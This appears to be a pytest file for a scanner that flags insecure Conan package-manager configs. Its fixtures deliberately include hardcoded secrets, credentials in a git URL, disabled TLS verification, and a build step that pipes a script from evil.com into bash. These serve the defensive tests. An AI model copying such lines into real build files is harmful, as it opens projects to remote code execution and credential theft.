"""Tests for ConanAnalyzer."""

from pathlib import Path

from devai.conan_analyzer import ConanAnalyzer, ConanFinding


INSECURE_CONANFILE_PY = """\
from conan import ConanFile
from conan.tools.files import get, download
from conan.tools.scm import Git


class InsecureDemoConan(ConanFile):
    name = "insecure-demo"
    version = "1.0.0"

    api_token = "hardcoded-secret-token-12345"

    def requirements(self):
        self.requires("openssl/[*]")

    def source(self):
        git = Git(self, folder="src")
        git.clone(url="https://user:pass@github.com/private/deps.git", target=".")
        git.checkout("main")

        get(self, "http://insecure.example.com/archive.tar.gz")

        download(self, "http://evil.com/tool.tar.gz", filename="tool.tar.gz")

        self.run("sh -c 'curl http://evil.com/install.sh | bash'")
"""

INSECURE_CONANFILE_TXT = """\
[requires]
openssl/[*]

[generators]
CMakeDeps

[options]
api_key=hardcoded-key-abc123
version=[*]
"""

INSECURE_REMOTES = """\
[
  {
    "name": "private",
    "url": "http://insecure.conan.io",
    "verify_ssl": false,
    "password": "hardcoded-remote-password"
  }
]
"""

INSECURE_PROFILE = """\
[settings]
os=Linux
arch=x86_64

[conf]
tools.system.package_manager:mode=install
core.download:insecure=True
"""

HARDENED_CONANFILE_PY = """\
from conan import ConanFile
from conan.tools.files import get
from conan.tools.scm import Git


class SecureDemoConan(ConanFile):
    name = "secure-demo"
    version = "1.0.0"

    def requirements(self):
        self.requires("openssl/3.0.12")

    def source(self):
        git = Git(self, folder="src")
        git.clone(url="https://github.com/org/mylib.git", target=".")
        git.checkout("v1.2.3")

        get(
            self,
            "https://example.com/archive.tar.gz",
            sha256="abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
        )
"""

HARDENED_REMOTES = """\
[
  {
    "name": "conancenter",
    "url": "https://center.conan.io",
    "verify_ssl": true
  }
]
"""


class TestConanAnalyzer:
    def test_no_configs(self, tmp_path: Path):
        analyzer = ConanAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert findings == []
        assert analyzer.stats.configs == 0

    def test_detects_insecure_conanfile_py(self, tmp_path: Path):
        (tmp_path / "conanfile.py").write_text(INSECURE_CONANFILE_PY, encoding="utf-8")
        analyzer = ConanAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "scm_credentials" in kinds
        assert "insecure_http" in kinds
        assert "unpinned_git_ref" in kinds
        assert "unverified_download" in kinds
        assert "curl_pipe_shell" in kinds
        assert "dangerous_run_command" in kinds

    def test_detects_insecure_conanfile_txt(self, tmp_path: Path):
        (tmp_path / "conanfile.txt").write_text(INSECURE_CONANFILE_TXT, encoding="utf-8")
        analyzer = ConanAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "unpinned_git_ref" in kinds

    def test_detects_insecure_remotes(self, tmp_path: Path):
        (tmp_path / "remotes.json").write_text(INSECURE_REMOTES, encoding="utf-8")
        analyzer = ConanAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "tls_verify_disabled" in kinds

    def test_detects_insecure_profile(self, tmp_path: Path):
        profiles = tmp_path / "profiles"
        profiles.mkdir()
        (profiles / "linux.profile").write_text(INSECURE_PROFILE, encoding="utf-8")
        analyzer = ConanAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "tls_verify_disabled" in kinds

    def test_hardened_conanfile_clean(self, tmp_path: Path):
        (tmp_path / "conanfile.py").write_text(HARDENED_CONANFILE_PY, encoding="utf-8")
        (tmp_path / "remotes.json").write_text(HARDENED_REMOTES, encoding="utf-8")
        analyzer = ConanAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "conanfile.py").write_text(INSECURE_CONANFILE_PY, encoding="utf-8")
        analyzer = ConanAnalyzer(str(tmp_path))
        finding = analyzer.analyze()[0]
        assert isinstance(finding, ConanFinding)
        assert finding.path == "conanfile.py"

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "conanfile.py").write_text(INSECURE_CONANFILE_PY, encoding="utf-8")
        analyzer = ConanAnalyzer(str(tmp_path))
        assert "Conan configs: 1" in analyzer.summary()
        context = analyzer.to_context()
        assert "Conan analysis:" in context

    def test_generate_hardened_config(self, tmp_path: Path):
        analyzer = ConanAnalyzer(str(tmp_path))
        config = analyzer.generate_hardened_config()
        assert "sha256" in config
        assert "ConanFile" in config

    def test_detects_conandata_yml(self, tmp_path: Path):
        (tmp_path / "conandata.yml").write_text(
            "sources:\n  1.0.0:\n    url: http://insecure.example.com/src.tar.gz\n",
            encoding="utf-8",
        )
        analyzer = ConanAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.kind == "insecure_http" for f in findings)
